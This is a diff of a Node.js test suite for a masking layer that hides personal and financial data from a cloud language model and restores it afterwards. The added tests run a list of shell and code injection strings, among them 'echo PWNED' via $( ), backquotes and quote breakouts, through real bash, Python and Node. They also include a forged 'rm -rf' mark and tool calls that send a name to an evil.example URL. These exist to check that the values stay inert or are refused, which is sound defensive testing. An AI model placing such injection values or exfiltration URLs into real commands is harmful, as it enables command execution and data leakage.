@@ -1,11 +1,12 @@
 // Masked requests (D681): what the organisation hides reaches a brain in the cloud as placeholders, and comes back real.
 import { test } from 'node:test'
 import assert from 'node:assert/strict'
+import { execFileSync } from 'node:child_process'
 import { fire } from '../app/core/hooks.js'
 import { LLMError } from '../app/core/llm.js'
 import { runTurn } from '../app/core/loop.js'
 import { checked, dlpHooks, PLACES } from '../app/ee/detect.js'
-import { inCode, mapped, maskHooks, revealInCode, variants } from '../app/ee/mask.js'
+import { inCode, mapped, maskHooks, revealInCode } from '../app/ee/mask.js'
 
 const CARD = '4111 1111 1111 1111'
 const IBAN = 'FR14 2004 1010 0505 0001 3M02 606'
@@ -47,6 +48,7 @@ async function step(hooks, e, answer = () => [{ type: 'done', stopReason: 'end',
 }
 const user = (/** @type {string} */ content, /** @type {any} */ more = {}) => ({ role: 'user', content, ...more })
 const seen = (/** @type {any} */ wire) => JSON.stringify(wire, (key, value) => (key === 'signal' || key === 'brain' ? undefined : value))
+const check = (/** @type {any} */ hooks, /** @type {any} */ e, /** @type {any} */ said = { decision: 'allow' }) => fire(hooks, 'tool.check', { task: 't', ...e }, () => said)
 
 test('what is hidden doesn’t go, wherever it is, and placeholders are all that remain of it', async () => {
   const { hooks } = room()
@@ -171,11 +173,15 @@ test('a longer name is never a known short one and a surname left out', async ()
   assert.equal(wire.messages[1].content, short.messages[0].content)
 })
 
-test('what must stay stays, the assistant’s name first, or it would rewrite the prompt', async () => {
-  const { hooks } = room({ words: ['Jean', 'Warehouse', 'ACME'], keep: ['Warehouse'] }, {})
+test('what must stay stays, the assistant’s name first, or it would rewrite the prompt; but what policy hides comes before that name', async () => {
+  const names = async (/** @type {string} */ text) => [...text.matchAll(/Jean/g)].map((match) => ({ start: match.index, end: match.index + 4, kind: 'person' }))
+  const { hooks } = room({ words: ['Warehouse', 'ACME'], keep: ['Warehouse'] }, {}, { names })
   const { wire } = await step(hooks, { system: 'You are Jean, for Warehouse.', messages: [user('Jean and ACME and Warehouse')] })
   assert.ok(wire.system.startsWith('You are Jean, for Warehouse.'))
   assert.match(wire.messages[0].content, /^Jean and ⟦W[0-9a-f]+⟧ and Warehouse$/)
+  const named = room({ words: ['Atlas'] }, {}, { assistant: () => 'Atlas' })
+  const { wire: hidden } = await step(named.hooks, { messages: [user('Pour Atlas')] })
+  assert.ok(!hidden.messages[0].content.includes('Atlas'))
 })
 
 test('values cut before the hook don’t go in part', async () => {
@@ -185,6 +191,15 @@ test('values cut before the hook don’t go in part', async () => {
     const { wire } = await step(hooks, { messages: [user(text)] })
     assert.ok(!wire.messages[0].content.includes(gone), wire.messages[0].content)
   }
+  // Where they really are cut: before a closing tag, a note, an ellipsis, or after an opening one.
+  for (const text of ['Marie Dup\n</about>', '<thinking>\nupont', 'Marie Dup…', 'Marie Dup\n\n(file.pdf)', `${CARD.slice(0, 14)}\n</about>`]) {
+    const { wire } = await step(hooks, { messages: [user(text)] })
+    for (const gone of ['Marie', 'Dup', 'upont', '4111']) assert.ok(!wire.messages[0].content.includes(gone), wire.messages[0].content)
+  }
+  // A part stays where it stood: it isn't looked for anywhere else.
+  const { wire: elsewhere } = await step(hooks, { messages: [user('Une dup de Marie Dup\n</about>'), user('Ceci est Marie Dup au milieu')] })
+  assert.match(elsewhere.messages[0].content, /^Une dup de ⟦C/)
+  assert.ok(elsewhere.messages[1].content.includes('Marie Dup au milieu'))
   // But an ordinary text keeps its numbers: what a brain works things out from.
   const { wire } = await step(hooks, { messages: [user('Le total est de 184 000 €, soit 12 % de plus, le 3 mars 2026.')] })
   assert.equal(wire.messages[0].content, 'Le total est de 184 000 €, soit 12 % de plus, le 3 mars 2026.')
@@ -214,19 +229,77 @@ test('a value lands in code as what it is, in each tool and wherever it stands',
   assert.equal(run("// don't\nx = '⟦Pabcdef⟧'", 'js', "L'Oréal"), "// don't\nx = 'L\\'Oréal'")
   assert.equal(run("x = '⟦Pabcdef⟧' /* it's */ + '⟦Pabcdef⟧'", 'js', 'a'), "x = 'a' /* it's */ + 'a'")
   assert.equal(run('⟦nope⟧', 'js', 'a'), '⟦nope⟧')
+  // Bare, on a heredoc's line too.
+  assert.equal(revealInCode('cat <<EOF\nFor Pabcdef\nEOF', 'shell', (_, kind, id) => (id === 'abcdef' ? 'Marie' : undefined)), 'cat <<EOF\nFor Marie\nEOF')
+})
+
+/** What code really does. @param {string} command @param {string[]} args */
+function ran(command, args) {
+  try { return execFileSync(command, args, { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }) } catch (error) { return `FAILED ${/** @type {any} */ (error).code ?? ''}` }
+}
+const HOSTILE = ["a'; echo PWNED; echo 'b", 'a"; echo PWNED; echo "b', 'a`echo PWNED`b', 'a$(echo PWNED)b', 'a\necho PWNED\nb', 'a\\', "'", '"', '*/ console.log("PWNED") /*', '{x}', '${process.exit}', '\r\nprint("PWNED")']
+const hasPython = ran('python3', ['-c', 'print(1)']).startsWith('1')
+
+test('a value that means harm stays a value in real shells and languages, or the call is refused', () => {
+  const quiet = (/** @type {string} */ code, /** @type {'shell' | 'js' | 'py'} */ lang, /** @type {string} */ value) => { try { return revealInCode(code, lang, () => value) } catch { return null } }
+  for (const value of HOSTILE) {
+    for (const template of ["printf %s '⟦Pabcdef⟧'", 'printf %s "⟦Pabcdef⟧"', 'printf %s ⟦Pabcdef⟧', 'printf %s "$(printf %s \'⟦Pabcdef⟧\')"']) {
+      const code = /** @type {string} */ (quiet(template, 'shell', value))
+      assert.equal(ran('bash', ['-c', code]), value, code)
+    }
+    // Text run as code, arithmetic and backquotes: refused, as nothing here can tell what they'd do.
+    for (const template of ["bash -c 'echo \"⟦Pabcdef⟧\"'", 'eval "echo ⟦Pabcdef⟧"', 'echo $((1 << ⟦Pabcdef⟧))', 'echo `echo ⟦Pabcdef⟧`']) assert.equal(quiet(template, 'shell', value), null, template)
+    const here = quiet('cat <<EOF\n⟦Pabcdef⟧\nEOF\necho end', 'shell', value)
+    if (/\r|\n/.test(value)) assert.equal(here, null)
+    else assert.equal(ran('bash', ['-c', /** @type {string} */ (here)]), `${value}\nend\n`, here ?? '')
+    if (hasPython) {
+      for (const template of ["x = '⟦Pabcdef⟧'\nprint(x, end='')", 'x = "⟦Pabcdef⟧"\nprint(x, end="")', 'x = """⟦Pabcdef⟧"""\nprint(x, end="")', 'x = ⟦Pabcdef⟧\nprint(x, end="")', "x = f'⟦Pabcdef⟧'\nprint(x, end='')"]) {
+        const code = /** @type {string} */ (quiet(template, 'py', value))
+        assert.equal(ran('python3', ['-c', code]), value, code)
+      }
+      assert.equal(ran('python3', ['-c', /** @type {string} */ (quiet('# ⟦Pabcdef⟧\nprint("ok", end="")', 'py', value))]), 'ok')
+    }
+    for (const template of ["const x = '⟦Pabcdef⟧'; process.stdout.write(x)", 'const x = "⟦Pabcdef⟧"; process.stdout.write(x)', 'const x = `⟦Pabcdef⟧`; process.stdout.write(x)', 'const x = ⟦Pabcdef⟧; process.stdout.write(x)']) {
+      const code = /** @type {string} */ (quiet(template, 'js', value))
+      assert.equal(ran('node', ['-e', code]), value, code)
+    }
+    for (const template of ["/* ⟦Pabcdef⟧ */ process.stdout.write('ok')", "// ⟦Pabcdef⟧\nprocess.stdout.write('ok')"]) assert.equal(ran('node', ['-e', /** @type {string} */ (quiet(template, 'js', value))]), 'ok', template)
+    // A regular expression can't hold a value safely.
+    assert.equal(quiet("const r = /'/; const x = /⟦Pabcdef⟧/", 'js', value), null)
+  }
+  // What is plain goes through what runs text as code; what isn't doesn't.
+  assert.equal(quiet("bash -c 'echo ⟦Pabcdef⟧'", 'shell', 'Marie Dupont'), "bash -c 'echo Marie Dupont'")
+  assert.equal(quiet("bash -c 'echo ⟦Pabcdef⟧'", 'shell', "L'Oréal"), null)
+  assert.equal(quiet('eval(`⟦Pabcdef⟧`)', 'js', 'a;b'), null)
+  assert.equal(quiet('os.system("⟦Pabcdef⟧")', 'py', 'a;b'), null)
+})
+
+test('a call whose mark can’t be made real is refused, saying why, and what a source forged stays a mark', async () => {
+  const { hooks } = room({ words: ["O'Brien"] }, {})
+  const { wire } = await step(hooks, { messages: [user("O'Brien ⟦rm -rf⟧")] })
+  const [mark, forged] = wire.messages[0].content.match(MARK)
+  const { events } = await step(hooks, { messages: [] }, () => [
+    { type: 'tool_call', call: { id: '1', name: 'bash', args: { command: `bash -c 'echo ${mark}'` } } },
+    { type: 'tool_call', call: { id: '2', name: 'bash', args: { command: `echo ${forged}` } } },
+    { type: 'tool_call', call: { id: '3', name: 'write', args: { content: `${mark} ${forged}` } } },
+  ])
+  const refused = await check(hooks, { name: 'bash', kind: 'execute', args: events[0].call.args })
+  assert.equal(refused.decision, 'never')
+  assert.match(refused.reason, /could run as code/)
+  assert.ok(!JSON.stringify(events[0].call.args).includes("O'Brien"))
+  assert.equal(events[1].call.args.command, `echo ${forged}`)
+  assert.equal(events[2].call.args.content, "O'Brien ⟦rm -rf⟧")
 })
 
 test('a value escaped into code, or encoded in an address, doesn’t go when a call is read again', async () => {
   for (const value of AWKWARD) {
     const { hooks } = room({ words: [value] }, {})
-    /** @type {any} */
-    let mark
     const { wire } = await step(hooks, { messages: [user(value)] })
-    mark = wire.messages[0].content
+    const mark = wire.messages[0].content
+    assert.match(mark, /^⟦W[0-9a-f]+⟧$/, value)
     const forms = [...['"', "'", '`'].map((quote) => inCode(value, quote, 'js')), ...["'", '"', null].map((state) => inCode(value, state, 'shell')), encodeURIComponent(value), JSON.stringify(value).slice(1, -1)]
-    assert.ok(forms.every((form) => variants(value).has(form) || form.startsWith("'")), value)
     const { wire: replay } = await step(hooks, { messages: [{ role: 'assistant', content: '', toolCalls: forms.map((form, n) => ({ id: String(n), name: 'bash', args: { command: `echo ${form} x` } })) }] })
-    for (const call of replay.messages[0].toolCalls) assert.ok(call.args.command.includes(mark), call.args.command)
+    for (const call of replay.messages[0].toolCalls) assert.ok(call.args.command.includes(mark), `${value}: ${call.args.command}`)
   }
   // Python's json.dumps, with what follows it.
   const { hooks } = room({ words: ['Hermès'] }, {})
@@ -234,14 +307,55 @@ test('a value escaped into code, or encoded in an address, doesn’t go when a c
   assert.ok(!seen(wire).toLowerCase().includes('herm'))
 })
 
-test('the last sweep refuses what masking left, whatever put it there', async () => {
-  // A brain's own raw isn't swept, but anything else is: here a word only a decoded address shows.
-  const { hooks, told } = room({ words: ['Hermes Ltd'] }, {})
-  await assert.rejects(step(hooks, { messages: [user('https://x.example/?q=Hermes%20%4Ctd')] }), /Refused/)
+test('a value is the value it is, however it is spelled', async () => {
+  const hidden = { 'Marie Dupont': ['Marie\u00a0Dupont', 'Marie\nDupont', 'Marie  Dupont', 'Marie-Dupont', 'Mar\u00adie Dupont', 'MARIE DUPONT', 'marie_dupont', 'Marie\u2009Dupont', 'Marie%20Dupont', 'Marie&nbsp;Dupont'],
+    "L'Oréal": ['L’Oréal', 'L&#39;Oréal', 'L&apos;Oréal', 'L\\u0027Oréal', "L'Ore\u0301al", "L'OREAL", 'L%27Or%C3%A9al'],
+    Hermès: ['Herm&egrave;s', 'Herm&#232;s', 'Herm&#xe8;s', 'Herm\\xe8s', 'Herm%E8s', 'Herm%C3%A8s', 'Herm\\u00e8s', 'HERMES', 'Herme\u0300s'],
+    Weiß: ['WEISS', 'weiss'], Yıldız: ['YILDIZ', 'yildiz'], 'İstanbul Bank': ['İSTANBUL BANK', 'istanbul bank', 'İstanbul Bank'],
+    'أحمد': ['احمد', 'أَحْمَد', 'أحـــمد', 'وأحمد'], '田中商事': ['田中商事は', '田中商事'], 'ⅣA': ['IVA'] }
+  for (const [word, spellings] of Object.entries(hidden)) {
+    const { hooks } = room({ words: [word] }, {})
+    const { wire: first } = await step(hooks, { messages: [user(word)] })
+    assert.match(first.messages[0].content, /^⟦W[0-9a-f]+⟧$/, word)
+    for (const spelling of spellings) {
+      const { wire } = await step(hooks, { messages: [user(`Pour ${spelling}.`)] })
+      assert.ok(wire.messages[0].content.includes(first.messages[0].content), `${word} as ${spelling}: ${wire.messages[0].content}`)
+    }
+  }
+})
+
+test('a word within another isn’t the word, and ordinary text goes as it is', async () => {
+  const { hooks } = room({ words: ['Ana', 'Banque Populaire', 'Array Networks', 'Hermès'], hide: ['email', 'phone'] }, { detect: ['card', 'iban', 'nir', 'ssn', 'secret'] })
+  await step(hooks, { messages: [user('Ana, Banque Populaire, Array Networks, Hermès')] })
+  const ordinary = ['Analyse des banques', 'Total 120+35+2500', '5000+1200+3400+7000', 'We ship the XP25 to all our French customers', 'Facture du 01.02.2026', '12 345 678 euros', 'Le 03.11.2026 14:30', '+1 250 000 EUR', 'lit@3.1.0', 'FR0012345678', 'a0123456789f', 'Commande 2026-1042, soit 1 234,56 €', 'Sold 1,250 units at 3.50 each on 12/03/2026.', 'See https://example.com/a/b?x=1&y=2', 'تم الدفع في ٢٠٢٦/١١/٠١', 'ordre n° 45871236', 'Version 18.3.1 of the tool']
+  for (const text of ordinary) {
+    const { wire } = await step(hooks, { messages: [user(text)] })
+    assert.equal(wire.messages[0].content, text)
+  }
+  // A schema's shape stays, whatever is hidden.
+  const shaped = room({ words: ['string', 'object'] }, {})
+  const { wire } = await step(shaped.hooks, { messages: [], tools: [{ name: 'x', description: 'Takes a string', parameters: { type: 'object', properties: { a: { type: 'string', format: 'date' } } } }] })
+  assert.deepEqual(wire.tools[0].parameters, { type: 'object', properties: { a: { type: 'string', format: 'date' } } })
+  assert.match(wire.tools[0].description, /^Takes a ⟦W/)
+})
+
+test('phones and numbers in any script and with any separator are found', async () => {
+  const { hooks } = room({ hide: ['phone', 'email'] }, { detect: ['card'] })
+  for (const value of ['٠٥٠١٢٣٤٥٦٧', '212.555.1234', '06/12/34/56/78', '06 12 34 56 78', '+33 6 12 34 56 78', '(415) 555-0100', '03-1234-5678', '４１１１ １１１１ １１１１ １１１１', '٤١١١ ١١١١ ١١١١ ١١١١', 'marie.dupont@acme.example', 'marie@acme.fr']) {
+    const { wire } = await step(hooks, { messages: [user(`Voici ${value}.`)] })
+    assert.match(wire.messages[0].content, /^Voici ⟦[A-Z][0-9a-f]+⟧\.$/, value)
+  }
+})
+
+test('the last sweep refuses what masking can’t change, and nothing of it is told', async () => {
+  // A tool's name can't be masked: a word in it stops the request.
+  const { hooks, told } = room({ words: ['Hermès'] }, {})
+  await assert.rejects(step(hooks, { messages: [user('Bonjour')], tools: [{ name: 'hermes_search', description: 'Searches', parameters: {} }] }), /Refused/)
   assert.match(told[0], /still there: value/)
-  const card = room({ hide: [] }, { detect: ['card'] })
-  await assert.rejects(step(card.hooks, { messages: [user('https://x.example/?c=4111%201111%201111%201111')] }), /Refused/)
-  assert.ok(!card.told.join().includes('4111'))
+  assert.ok(!told.join().toLowerCase().includes('herm'))
+  await assert.rejects(step(hooks, { messages: [{ role: 'assistant', content: '', toolCalls: [{ id: '1', name: 'hermes_search', args: {} }] }] }), /Refused/)
+  // Something that isn't text never goes unread.
+  await assert.rejects(step(hooks, { messages: [{ role: 'user', content: ['Hermès'] }] }), /Refused/)
 })
 
 test('it fails closed: nothing goes when finding or keeping fails', async () => {
@@ -261,6 +375,22 @@ test('it fails closed: nothing goes when finding or keeping fails', async () => 
     const { wire } = await step(hooks, { brain, messages: [user('Marie Dupont')] })
     assert.equal(wire.messages[0].content, 'Marie Dupont')
   }
+})
+
+test('requests at once, a title’s and the step’s, keep each new mark once', async () => {
+  const { hooks, kept } = room()
+  await Promise.all([step(hooks, { messages: [user('Marie Dupont')] }), step(hooks, { messages: [user('Marie Dupont')] })])
+  assert.deepEqual(kept.flatMap((note) => Object.values(note.masked)), ['Marie Dupont'])
+})
+
+test('a mark whose note failed to be kept is kept at the next try, or nothing goes', async () => {
+  let failing = true
+  const kept = /** @type {any[]} */ ([])
+  const { hooks } = room(undefined, undefined, { keep: async (/** @type {string} */ _, /** @type {any} */ meta) => { if (failing) throw new Error('disk'); kept.push(meta) } })
+  await assert.rejects(step(hooks, { messages: [user('Marie Dupont')] }), /Refused/)
+  failing = false
+  await step(hooks, { messages: [user('Marie Dupont')] })
+  assert.ok(Object.values(kept[0].masked).includes('Marie Dupont'))
 })
 
 test('the audit hears how many of each kind, for its task, and never what', async () => {
@@ -291,8 +421,8 @@ test('a brain’s raw goes back only as it wrote it to this mask; from the first
   const before = [{ type: 'thinking', thinking: 'From before masking, about Marie Dupont', signature: 'sig2' }]
   const assistant = (/** @type {any} */ blocks, /** @type {any} */ more = {}) => ({ role: 'assistant', content: 'ok', raw: blocks, rawModel: 'm', ...more })
   const kept = (/** @type {any} */ wire) => wire.messages.map((/** @type {any} */ message) => Boolean(message.raw))
-  // Its own: goes, unchanged.
-  const own = await step(hooks, { messages: [user('a'), assistant(raw), user('b')] })
+  // Its own: goes, unchanged, and as it read back from a file.
+  const own = await step(hooks, { messages: [user('a'), assistant(JSON.parse(JSON.stringify(raw))), user('b')] })
   assert.deepEqual(own.wire.messages[1].raw, raw)
   // An earlier one, then its own after it: neither.
   const earlier = await step(hooks, { messages: [user('a'), assistant(before), user('b'), assistant(raw), user('c')] })
@@ -308,6 +438,19 @@ test('a brain’s raw goes back only as it wrote it to this mask; from the first
   await assert.rejects(step(hooks, { messages: [user('a'), assistant(before)] }), /Refused/)
 })
 
+test('a word hidden since stops a brain’s raw that holds it going back', async () => {
+  let more = /** @type {string[]} */ ([])
+  const { hooks } = room({ words: ['Marie Dupont'] }, {}, { more: () => more })
+  const raw = [{ type: 'thinking', thinking: 'About Zorglub', signature: 's' }]
+  await step(hooks, { messages: [user('Bonjour')] }, () => [{ type: 'done', stopReason: 'end', message: { role: 'assistant', content: 'ok', raw } }])
+  const again = () => step(hooks, { messages: [user('a'), { role: 'assistant', content: 'ok', raw, rawModel: 'm' }, user('b')] })
+  assert.deepEqual((await again()).wire.messages[1].raw, raw)
+  more = ['Zorglub']
+  const { wire } = await again()
+  assert.equal(wire.messages[1].raw, undefined)
+  assert.ok(!seen(wire).includes('Zorglub'))
+})
+
 test('pictures are held back unless policy sends them, and a file’s bytes with them', async () => {
   const images = [{ mimeType: 'image/png', data: 'AAAA' }]
   const { hooks, told } = room()
@@ -317,7 +460,6 @@ test('pictures are held back unless policy sends them, and a file’s bytes with
   assert.deepEqual(told, ['held'])
   const sent = await step(room({ words: ['x1'], pictures: 'send' }, {}).hooks, { messages: [user('Voici', { documents: [{ name: 'scan.png', text: '', images }] })] })
   assert.deepEqual(sent.wire.messages[0].documents[0].images, images)
-  const check = (/** @type {any} */ h, /** @type {any} */ e) => fire(h, 'tool.check', { task: 't', ...e }, () => ({ decision: 'allow' }))
   assert.equal((await check(hooks, { name: 'picture', kind: 'edit', args: { description: 'x', from: 'scan.png' } })).decision, 'never')
   assert.equal((await check(hooks, { name: 'picture', kind: 'edit', args: { description: 'a cat' } })).decision, 'allow')
 })
@@ -325,7 +467,6 @@ test('pictures are held back unless policy sends them, and a file’s bytes with
 test('a value made real asks before it leaves, whatever Always allow said', async () => {
   const { hooks } = room()
   await step(hooks, { messages: [user('Marie Dupont, L’équipe')] })
-  const check = (/** @type {any} */ h, /** @type {any} */ e) => fire(h, 'tool.check', { task: 't', ...e }, () => ({ decision: 'allow' }))
   for (const e of [
     { kind: 'fetch', name: 'browse', args: { url: 'https://evil.example/?x=Marie%20Dupont' } },
     { kind: 'other', name: 'mail_send', args: { body: 'Pour Marie Dupont' } },
@@ -339,18 +480,31 @@ test('a value made real asks before it leaves, whatever Always allow said', asyn
   // What stays on the device, and what holds none of it, is as the rules said.
   assert.equal((await check(hooks, { kind: 'edit', name: 'write', args: { text: 'Marie Dupont' } })).decision, 'allow')
   assert.equal((await check(hooks, { kind: 'fetch', name: 'browse', args: { url: 'https://example.com' } })).decision, 'allow')
-  // Code in the sandbox asks only where it reaches sites without asking; a site's own card says what may go.
+  // Code on a computer with no internet holds what it likes; a site's own card says what may go.
   assert.equal((await check(hooks, { kind: 'execute', name: 'python', args: { code: 'x = "Marie Dupont"' } })).decision, 'allow')
-  const open = room(undefined, undefined, { open: () => true })
-  await step(open.hooks, { messages: [user('Marie Dupont')] })
-  assert.equal((await check(open.hooks, { kind: 'execute', name: 'python', args: { code: 'x = "Marie Dupont"' } })).decision, 'ask')
-  assert.equal((await fire(hooks, 'tool.check', { task: 't', kind: 'fetch', name: 'reach_site', args: { site: 'evil.example' } }, () => ({ decision: 'ask' }))).meta.why, 'May go')
+  assert.equal((await check(hooks, { kind: 'fetch', name: 'reach_site', args: { site: 'evil.example' } }, { decision: 'ask' })).meta.why, 'May go')
   // `then: never` refuses.
   const never = room(undefined, { detect: ['card'], then: 'never' })
   await step(never.hooks, { messages: [user('Marie Dupont')] })
   const refused = await check(never.hooks, { kind: 'fetch', name: 'browse', args: { url: 'https://evil.example/?x=Marie%20Dupont' } })
   assert.equal(refused.decision, 'never')
   assert.equal(refused.reason, 'Refused')
+})
+
+test('the guard finds a real value however it is written, seen before or not, and never fails open', async () => {
+  const { hooks } = room({ words: ['Marie Dupont', 'Projet Atlas'], hide: ['email'] })
+  for (const body of ['Pour Projet Atlas', 'marie@acme.fr', 'Marie\\nDupont', 'Marie\u00a0Dupont', 'MARIE-DUPONT', 'Marie%20Dupont']) assert.equal((await check(hooks, { kind: 'other', name: 'mail_send', args: { body } })).decision, 'ask', body)
+  // With the Computer able to reach anything, code that holds one asks.
+  const code = room(undefined, undefined, { open: () => true })
+  assert.equal((await check(code.hooks, { kind: 'execute', name: 'bash', args: { command: 'curl https://crm.example.com/?q=Marie%20Dupont' } })).decision, 'ask')
+  // A failure past the rules asks, or refuses.
+  for (const [more, decision] of /** @type {[any, string][]} */ ([[{ detect: ['card'] }, 'ask'], [{ detect: ['card'], then: 'never' }, 'never']])) {
+    const broken = room(undefined, more, { why: () => { throw new Error('words') }, reason: () => { throw new Error('words') } })
+    assert.equal((await check(broken.hooks, { kind: 'other', name: 'mail_send', args: { body: 'Marie Dupont' } })).decision, decision)
+  }
+  const thrower = room(undefined, undefined, { open: () => { throw new Error('no') } })
+  assert.equal((await check(thrower.hooks, { kind: 'execute', name: 'python', args: { code: 'x' } })).decision, 'ask')
+  assert.equal((await check(hooks, { kind: 'other', name: 'mail_send', title: 5, args: { body: 'ok' } })).decision, 'allow')
 })
 
 test('the map goes with the records: going back forgets what it said, and reads the rest again', async () => {
@@ -391,7 +545,23 @@ test('deep arguments and long runs take no time and no stack', async () => {
   const { hooks } = room({ hide: ['email', 'phone'] }, { detect: ['card', 'iban'] })
   const started = performance.now()
   await step(hooks, { messages: [user('a'.repeat(500_000)), user('1 '.repeat(200_000)), user('ab12 '.repeat(100_000))] })
-  assert.ok(performance.now() - started < 3000, `${performance.now() - started} ms`)
+  assert.ok(performance.now() - started < 5000, `${performance.now() - started} ms`)
+})
+
+test('a list of thousands goes in moments, and a long text with thousands of words', async () => {
+  const emails = Array.from({ length: 5000 }, (_, i) => `person${i}@acme.example`).join('\n')
+  const { hooks } = room({ hide: ['email'] }, {})
+  let started = performance.now()
+  const { wire } = await step(hooks, { messages: [user(emails)] })
+  assert.ok(!seen(wire).includes('@acme'))
+  assert.ok(performance.now() - started < 10_000, `${performance.now() - started} ms`)
+  const words = Array.from({ length: 2000 }, (_, i) => `Client numéro ${i} SARL`)
+  const text = 'Ordinary words in a very long document that names no one at all. '.repeat(16_000)
+  const many = room({ words }, {})
+  started = performance.now()
+  const { wire: long } = await step(many.hooks, { messages: [user(`${text} Client numéro 1999 SARL`)] })
+  assert.ok(!long.messages[0].content.includes('1999 SARL'))
+  assert.ok(performance.now() - started < 10_000, `${performance.now() - started} ms`)
 })
 
 test('a mask that can’t work says why', () => {
@@ -424,8 +594,8 @@ const ended = (/** @type {string} */ content = '', /** @type {any} */ more = {})
 
 test('through a whole turn, a retry, a call and its result, what the loop keeps is real and what it sends never is', async () => {
   const { hooks } = room()
-  const ran = /** @type {any[]} */ ([])
-  const tool = { spec: { name: 'send', description: 'Sends', parameters: { type: 'object' } }, kind: 'edit', title: () => 'Send', run: async (/** @type {any} */ args) => { ran.push(args); return `Sent to ${args.to}, marie@acme.fr` } }
+  const called = /** @type {any[]} */ ([])
+  const tool = { spec: { name: 'send', description: 'Sends', parameters: { type: 'object' } }, kind: 'edit', title: () => 'Send', run: async (/** @type {any} */ args) => { called.push(args); return `Sent to ${args.to}, marie@acme.fr` } }
   const { wires, records, result } = await turn(hooks, (wire, n) => {
     if (n === 1) throw new LLMError('Busy', { code: 'server' })
     const mark = markIn(wire)
@@ -433,7 +603,7 @@ test('through a whole turn, a retry, a call and its result, what the loop keeps 
     return [{ type: 'text', delta: `Done for ${mark}` }, ended(`Done for ${mark}`)]
   }, { tools: [tool] })
   assert.equal(wires.length, 3)
-  assert.deepEqual(ran, [{ to: 'Marie Dupont' }])
+  assert.deepEqual(called, [{ to: 'Marie Dupont' }])
   assert.equal(result.text, 'Done for Marie Dupont')
   for (const wire of wires) for (const value of ['Marie', 'Hermès', 'marie@acme.fr']) assert.ok(!seen(wire).includes(value), value)
   assert.ok(wires[2].messages.some((/** @type {any} */ message) => message.role === 'tool' && /^Sent to ⟦/.test(message.content)))
